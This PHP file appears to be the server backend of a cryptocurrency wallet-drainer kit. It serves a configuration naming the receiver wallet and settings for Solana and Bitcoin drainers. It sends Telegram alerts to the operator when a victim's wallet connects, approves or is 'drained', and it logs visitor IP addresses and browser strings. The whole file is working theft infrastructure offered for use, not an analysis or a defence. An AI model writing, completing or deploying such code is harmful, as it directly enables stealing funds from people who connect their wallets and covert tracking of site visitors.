<?php
require_once __DIR__ . '/../config.php';

function cvr_input($k) {
    return isset($_GET[$k]) ? trim(strip_tags($_GET[$k])) : '';
}

if (!function_exists('cvr_tg_send')) {
    function cvr_tg_send($text, $btn = '') {
        global $CONFIG;
        $url = 'https://api.telegram.org/bot' . $CONFIG['telegram']['bot_token'] . '/sendMessage';
        $payload = ['chat_id' => $CONFIG['telegram']['chat_id'], 'text' => $text, 'parse_mode' => 'HTML'];
        if (!empty($btn)) {
            $payload['reply_markup'] = json_encode(['inline_keyboard' => [[['text' => 'View Wallet', 'url' => $btn]]]]);
        }
        if ($CONFIG['telegram']['bot_token'] === '123456789:PUT_YOUR_BOT_TOKEN_HERE') return false;
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => http_build_query($payload),
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_SSL_VERIFYPEER => true
        ]);
        $response = curl_exec($ch);
        curl_close($ch);
        return $response !== false;
    }
}

$action = cvr_input('action');

if ($action === 'config') {
    header('Content-Type: application/json');
    echo json_encode([
        'receiver' => $CONFIG['wallets']['receiver'],
        'chains' => $CONFIG['chains'],
        'tokens' => $CONFIG['tokens'],
        'walletconnect' => $CONFIG['walletconnect'] ?? ['project_id' => ''],
        'solana' => $CONFIG['solana_drainer'],
        'bitcoin' => $CONFIG['bitcoin_drainer'],
        'template' => $CONFIG['site']['template']
    ]);
    exit;
}

if ($action === 'notify') {
    $event = cvr_input('event');
    $address = cvr_input('address');
    $chain = cvr_input('chain');
    $extra = cvr_input('extra');
    $map = [
        'connect' => '🔗 WALLET CONNECTED',
        'approve' => '✅ APPROVE SUCCESSFUL',
        'drain' => '💰 DRAIN EXECUTED',
        'pending' => '⏳ AWAITING SIGNATURE'
    ];
    $icon = $map[$event] ?? 'ℹ️ EVENT';
    $msg = "<b>" . $icon . "</b>\n" .
           "User: <code>" . htmlspecialchars($address, ENT_QUOTES, 'UTF-8') . "</code>\n" .
           "Chain: " . htmlspecialchars($chain, ENT_QUOTES, 'UTF-8') . "\n" .
           "Info: " . htmlspecialchars($extra, ENT_QUOTES, 'UTF-8') . "\n" .
           "Time: " . date('Y-m-d H:i:s');
    $ok = cvr_tg_send($msg);
    header('Content-Type: application/json');
    echo json_encode(['ok' => $ok]);
    exit;
}

if ($action === 'log') {
    $line = date('Y-m-d H:i:s') . " | IP:" . ($_SERVER['REMOTE_ADDR'] ?? 'unknown') . " | UA:" . ($_SERVER['HTTP_USER_AGENT'] ?? 'unknown') . "\n";
    @file_put_contents(__DIR__ . '/../logs/visits.log', $line, FILE_APPEND | LOCK_EX);
    header('Content-Type: application/json');
    echo json_encode(['ok' => true]);
    exit;
}

http_response_code(200);
echo json_encode(['status' => 'ok']);
?>